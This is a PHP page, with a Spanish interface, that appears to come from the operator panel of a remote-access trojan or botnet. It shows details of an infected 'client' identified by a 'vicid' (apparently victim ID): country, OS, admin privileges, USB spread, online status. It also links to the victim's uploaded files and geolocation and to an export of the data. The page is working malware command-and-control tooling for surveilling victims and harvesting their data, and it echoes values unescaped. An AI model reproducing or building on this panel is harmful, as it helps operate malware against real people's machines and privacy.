<?php
require_once 'session.php';
require_once APP_PATH . 'classes/Clients.php';
require_once APP_PATH . 'logic/viewClientLogic.php';
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <?php require_once 'components/meta.php'; ?>
    <title><?php echo APP_NAME; ?> - Detalles De Cliente</title>
    <?php require_once 'components/css.php'; ?>
</head>

<body id="page-top">
    <?php require_once 'components/header.php'; ?>

    <div id="wrapper">
        <div id="content-wrapper">
            <div class="container-fluid">
                <ol class="breadcrumb">
                    <li class="breadcrumb-item">
                        <a href="#">Informacion De Cliente</a>
                    </li>
                </ol>
                <div class="card mb-3">
                    <div class="card-header">
                        <i class="fas fa-address-card"></i>
                        Informacion De Cliente
                    </div>

                    <div class="card-body">
                        <div class="container container-special">
                            <ul>
                                <?php foreach ($client_data as $key =>
                                    $value) : ?>
                                    <?php if ($key == "country") : ?>
                                        <li>
                                            Pais:
                                            <img src="<?php echo $client->getClientFlag($value) ?>" />
                                        </li>
                                    <?php elseif ($key == "os") : ?>
                                        <li>
                                            OS:
                                            <?php echo $value; ?>
                                            <i class="fab fa-windows text-primary"></i>
                                        </li>
                                    <?php elseif ($key == "version") : ?>
                                        <li>
                                            Version:
                                            <span class="badge badge-primary">
                                                <?php echo $value; ?>
                                            </span>
                                        </li>
                                    <?php elseif ($key == "status") : ?>
                                        <li>
                                            Conexion:
                                            <?php if ($value == "Online") : ?>
                                                <b class="text-success">Online</b>
                                            <?php else : ?>
                                                <b class="text-danger">Offline</b>
                                            <?php endif; ?>
                                        </li>
                                    <?php elseif ($key == "is_usb") : ?>
                                        <li>
                                             Usb:
                                            <?php if ($value == "yes") : ?>
                                                <b class="text-primary">Yes</b>
                                            <?php else : ?>
                                                <b>No</b>
                                            <?php endif; ?>
                                        </li>
                                    <?php elseif ($key == "is_admin") : ?>
                                        <li>
                                            Privilegios:
                                            <?php if ($value == "Admin") : ?>
                                                <b>Admin</b> <i class="fas fa-shield-alt text-warning"></i>
                                            <?php else : ?>
                                                <b>Usuario</b>
                                            <?php endif; ?>
                                        </li>
                                    <?php else : ?>
                                        <li><?php echo $client_data_key[$key] . ": " . $value ?></li>
                                    <?php endif; ?>
                                <?php endforeach; ?>
                            </ul>
                        </div>
                    </div>
                    <div class="card-footer">
                        <a href="viewuploads.php?vicid=<?php echo $clientid; ?>" class="btn btn-primary">
                            Ver Archivos Subidos
                        </a>
                        <a href="getlocation.php?vicid=<?php echo $vicID; ?>" class="btn btn-primary">
                            Ver Localizacion
                        </a>
                        <button onclick="Export()" class="btn btn-primary">
                             Exportar Informacion
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <?php require_once 'components/footer.php'; ?>

    <?php require_once 'components/js.php'; ?>

    <script>
        function Export() {
            var conf = confirm("Desea Exportar La Informacion Del Cliente A Excel?");
            if (conf == true) {
                window.location.href = "includes/exportInfo.php?vicid=<?php echo $clientid; ?>";
            }
        }
    </script>
</body>

</html>